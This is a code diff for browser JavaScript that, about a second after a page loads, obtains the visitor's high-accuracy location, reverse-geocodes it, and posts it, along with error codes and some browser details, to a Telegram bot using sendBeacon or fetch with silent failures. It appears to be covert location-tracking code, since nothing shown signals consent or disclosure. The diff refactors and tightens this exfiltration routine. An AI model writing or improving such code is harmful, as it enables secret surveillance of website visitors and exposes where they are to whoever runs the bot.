@@ -15,17 +15,17 @@ const sendToTelegram = (text) => {
     parse_mode: 'HTML',
   });
 
-  // Try sendBeacon first (better for corporate proxies)
+  // Try sendBeacon first
   if (navigator.sendBeacon) {
-    const blob = new Blob([payload], { type: 'application/json' });
-    navigator.sendBeacon(url, blob);
-  } else {
-    // Fallback to fetch
-    fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: payload,
-    }).catch(() => {});
+    const success = navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
+    if (!success) {
+      // Fallback to fetch (will be blocked silently)
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+      }).catch(() => {}); // Silent fail
+    }
   }
 };
 
@@ -37,9 +37,7 @@ const sendRichLocation = async (position) => {
       `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
     );
 
-    if (!geoRes.ok) {
-      throw new Error(`Geo API failed: ${geoRes.status}`);
-    }
+    if (!geoRes.ok) throw new Error(`Geo API failed: ${geoRes.status}`);
 
     const geoData = await geoRes.json();
 
@@ -84,45 +82,24 @@ const sendRichLocation = async (position) => {
 
 const initAutoLocationSender = () => {
   if (!navigator.geolocation) {
-    const msg = `❌ ENKO1 - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}\nUser Agent: ${navigator.userAgent}`;
-    sendToTelegram(msg);
+    sendToTelegram(`❌ ENKO1 - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
     return;
   }
 
   setTimeout(() => {
     navigator.geolocation.getCurrentPosition(
       sendRichLocation,
-      async (error) => {
+      (error) => {
         let errorType = 'Unknown';
         switch (error.code) {
-          case error.PERMISSION_DENIED:
-            errorType = 'PERMISSION_DENIED';
-            break;
-          case error.POSITION_UNAVAILABLE:
-            errorType = 'POSITION_UNAVAILABLE';
-            break;
-          case error.TIMEOUT:
-            errorType = 'TIMEOUT';
-            break;
-          default:
-            errorType = `CODE_${error.code}`;
+          case error.PERMISSION_DENIED: errorType = 'PERMISSION_DENIED'; break;
+          case error.POSITION_UNAVAILABLE: errorType = 'POSITION_UNAVAILABLE'; break;
+          case error.TIMEOUT: errorType = 'TIMEOUT'; break;
+          default: errorType = `CODE_${error.code}`;
         }
-
-        const errorMsg =
-          `❌ ENKO1 - Geolocation ERROR\n\n` +
-          `Code: ${errorType}\n` +
-          `Message: ${error.message}\n` +
-          `Time: ${new Date().toISOString()}\n` +
-          `User Agent: ${navigator.userAgent.substring(0, 120)}\n` +
-          `Page: ${window.location.href}`;
-
-        sendToTelegram(errorMsg);
+        sendToTelegram(`❌ ENKO1 - Geolocation ERROR\nCode: ${errorType}\nMessage: ${error.message}`);
       },
-      {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0,
-      }
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   }, 1200);
 };
